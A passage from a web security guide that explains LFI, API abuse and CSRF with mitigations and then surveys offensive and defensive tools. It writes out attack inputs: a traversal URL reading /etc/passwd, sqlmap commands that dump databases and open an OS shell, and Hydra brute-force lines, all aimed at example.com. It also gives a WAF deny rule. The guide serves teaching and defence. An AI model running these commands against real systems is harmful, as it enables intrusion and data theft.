LFI vulnerabilities allow attackers to access files on the server by exploiting dynamic file inclusion.

### Example:
```php
<?php
    $file = $_GET['file'];
    include("pages/" . $file);
?>
```
**Attack URL**:
```
http://example.com/vulnerable.php?file=../../etc/passwd
```

### Impact:
- Exposure of sensitive files (e.g., `/etc/passwd` on Linux).
- Potential for remote code execution if combined with file upload vulnerabilities.

### Mitigation:
- Restrict file paths to prevent directory traversal:
  ```php
  $file = basename($file); // Removes directory traversal
  include("pages/" . $file);
  ```
- Set restrictive file permissions to limit access to sensitive directories.

---

## API Exploitation

### Description:
APIs (Application Programming Interfaces) can be exploited if they lack proper authentication, rate-limiting, or input validation.

### Techniques:
1. **Unrestricted Access**:
   - Access sensitive endpoints without authentication.
   ```bash
   curl -X GET http://example.com/api/admin
   ```

2. **Mass Assignment**:
   - Exploit misconfigured APIs to modify protected attributes.
   ```json
   PATCH /users/1
   {
       "role": "admin"
   }
   ```

3. **Parameter Tampering**:
   - Modify parameters to bypass restrictions.
   ```bash
   curl -X POST -d "price=1" http://example.com/api/buy
   ```

### Mitigation:
- Enforce proper authentication and authorization for all API endpoints.
- Use schema validation to prevent mass assignment:
  ```json
  {
      "type": "object",
      "properties": {
          "role": { "enum": ["user", "moderator"] }
      },
      "required": ["role"]
  }
  ```
- Implement rate limiting to prevent abuse (init)
  ```
  LimitRequestBody 1024
  ```

---

## Cross-Site Request Forgery (CSRF)

### Description:
CSRF attacks trick authenticated users into performing unwanted actions on a web application.

### Example:
```html
<!-- Malicious Website -->
<form action="http://example.com/delete-account" method="POST">
    <input type="hidden" name="user_id" value="123">
    <input type="submit" value="Click me!">
</form>
```

### Impact:
- Deletion of user accounts.
- Unauthorized actions on behalf of the victim.

### Mitigation:
1. **CSRF Tokens**:
   - Include unique tokens in forms and verify them on the server.
   ```php
   <input type="hidden" name="csrf_token" value="<?php echo generate_csrf_token(); ?>">
   ```
2. **SameSite Cookies**:
   - Set cookies to prevent cross-origin requests:
   ```
   Set-Cookie: sessionid=abc123; SameSite=Strict
   ```

3. **Use Referrer Headers**:
   - Verify the origin of the request.

---

# **Featured Hacking Tools**

### 1. **Burp Suite**
- A comprehensive web application testing framework.
- Ideal for finding vulnerabilities like XSS, CSRF, and SQL Injection.

**Common Features**:
- Proxy for capturing and modifying HTTP/HTTPS traffic.
- Intruder for fuzzing and brute force attacks.
- Repeater for manual testing of requests.

**Advanced Usage**:
- **Using Intruder for Parameter Fuzzing**:
  1. Intercept a request with Burp Proxy.
  2. Send the request to Intruder.
  3. Set the payload position in the request (e.g., `username=admin`).
  4. Use a payload list for testing injection vulnerabilities.

- **Custom Extensions**:
  Install extensions from the BApp Store for automated scanning:
  - **SQLiPy**: For SQL injection detection.
  - **AuthMatrix**: For testing authentication and authorization flows.

---

### 2. **SQLmap**
- Automates the process of exploiting SQL injection vulnerabilities.

**Commands**:
1. **Basic Scan**:
   ```bash
   sqlmap -u "http://example.com/page?id=1"
   ```

2. **Extract Database Names**:
   ```bash
   sqlmap -u "http://example.com/page?id=1" --dbs
   ```

3. **Dump Entire Database**:
   ```bash
   sqlmap -u "http://example.com/page?id=1" -D example_db --dump
   ```

**Advanced Usage**:
- Use `--os-shell` to attempt OS command execution:
  ```bash
  sqlmap -u "http://example.com/page?id=1" --os-shell
  ```

---

### 3. **Hydra**
- A fast and flexible brute force password-cracking tool.

**Common Commands**:
1. **Basic Brute Force**:
   ```bash
   hydra -l admin -P passwords.txt ftp://example.com
   ```

2. **Brute Force Over HTTP Forms**:
   ```bash
   hydra -l admin -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
   ```

**Advanced Usage**:
- Use parallel processing for faster attacks:
  ```bash
  hydra -t 16 -L usernames.txt -P passwords.txt ssh://example.com
  ```

---

### 4. **Nmap**
- A powerful tool for network scanning and vulnerability detection.

**Common Commands**:
1. **Basic Port Scan**:
   ```bash
   nmap -p 1-65535 example.com
   ```

2. **OS Detection**:
   ```bash
   nmap -O example.com
   ```

3. **Vulnerability Scan**:
   ```bash
   nmap --script vuln example.com
   ```

**Advanced Usage**:
- **Detect Firewalls**:
  ```bash
  nmap --script http-waf-detect --script-args http-waf-detect.aggro http://example.com
  ```
- **Custom Scripts**:
  Write custom NSE (Nmap Scripting Engine) scripts to perform application-specific scans.

---

# **Featured Defence Tools**

### 1. **ModSecurity (WAF)**

**Setup**:
- Install ModSecurity on an Apache server:
  ```bash
  sudo apt install libapache2-mod-security2
  sudo a2enmod security2
  ```

**Usage**:
- Enable OWASP CRS (Core Rule Set) for preconfigured protection:
  ```bash
  sudo apt install modsecurity-crs
  ```

**Advanced Configuration**:
- Customize rules to block specific patterns:
  ```plaintext
  SecRule ARGS "select .* from" "id:1234,phase:2,deny,status:403,msg:'SQL Injection Detected'"
  ```

---

### 2. **OWASP ZAP**
- A dynamic application security testing (DAST) tool for finding vulnerabilities.

**Common Commands**:
- **Quick Scan**:
  ```bash
  zap-cli quick-scan --self-contained http://example.com
  ```

- **Spider a Website**:
  ```bash
  zap-cli spider http://example.com
  ```

**Advanced Usage**:
- Automated Scanning:
  - Configure ZAP in a CI/CD pipeline for automated scans during builds.

---

### 3. **Nmap**
- Useful not just for reconnaissance but also for detecting specific vulnerabilities.

**Vulnerability Scripts**:
1. **SSL Vulnerabilities**:
   ```bash
   nmap --script ssl-enum-ciphers -p 443 example.com
   ```

2. **Detect Default Credentials**:
   ```bash
   nmap --script http-default-accounts http://example.com
   ```

---

### 4. **Acunetix Web Vulnerability Scanner**
- A commercial scanner for comprehensive vulnerability assessments.

**Features**:
- Scans for OWASP Top 10 vulnerabilities.
- Advanced scanning for SPAs (Single Page Applications).

**Usage**:
1. Add the target URL to the dashboard.
2. Configure custom scan policies for specific vulnerabilities.
3. Analyze the generated report for detailed remediation steps.

---

## N-Stalker Web App Security Scanner

### Description:
N-Stalker is a powerful web application security scanner designed to identify vulnerabilities, including OWASP Top 10 risks.

### Features:
- Automated scanning for SQL Injection, XSS, and CSRF.
- Advanced spidering to uncover hidden endpoints.
- Compliance checks for industry standards like PCI DSS.

### Usage:
1. Launch the N-Stalker GUI.
2. Configure the target URL and scan scope.
3. Start a scan and review the detailed vulnerability report.

**Output Example**:
```text
Vulnerability: SQL Injection
Risk Level: High
Affected URL: http://example.com/login.php
```

### Advantages:
- Easy to use for both beginners and professionals.
- Comprehensive reporting with remediation guidance.

---

## Shieldfy

### Description:
Shieldfy is a lightweight, real-time security tool that integrates directly into your web application to monitor and mitigate threats.

### Features:
- Monitors web applications for suspicious activities in real-time.
- Prevents SQL Injection, XSS, and other attacks.
- Detailed alerts and dashboards for monitoring security events.

### Usage:
1. Install the Shieldfy SDK in your application.
2. Configure it with your project’s API key.
3. Monitor attacks and security issues in the Shieldfy dashboard.

**Integration Example (Node.js)**:
```javascript
const shieldfy = require('shieldfy');
shieldfy.init('YOUR_API_KEY');
```

### Advantages:
- Real-time threat detection.
- Easy integration with minimal performance overhead.

---

## Nmap

### Description:
Nmap is a versatile open-source network scanner used to identify open ports, services, and vulnerabilities.

### Features:
- Port scanning to detect open services.
- Scriptable interactions using the Nmap Scripting Engine (NSE).
- Advanced fingerprinting for service and OS detection.

### Usage Examples:
1. **Basic Scan**:
   ```bash
   nmap example.com
   ```
   *Output*:
   ```text
   PORT    STATE SERVICE
   80/tcp  open  http
   443/tcp open  https
   ```

2. **Vulnerability Detection**:
   ```bash
   nmap --script vuln example.com
   ```
   *Output*:
   ```text
   VULNERABILITY: SSL POODLE
   Severity: High
   ```

3. **Detect Web Application Firewalls**:
   ```bash
   nmap --script=http-waf-detect example.com
   ```

### Advantages:
- Widely used and supported by a vast community.
- Extensible with custom scripts for specific use cases.

---

## Summary

Each tool provides unique strengths in securing web applications. Combining scanners like **N-Stalker**, real-time protection like **Shieldfy**, and network-level reconnaissance with **Nmap** ensures a robust defense strategy. These tools are invaluable for ethical hackers and security teams alike.

30''15'

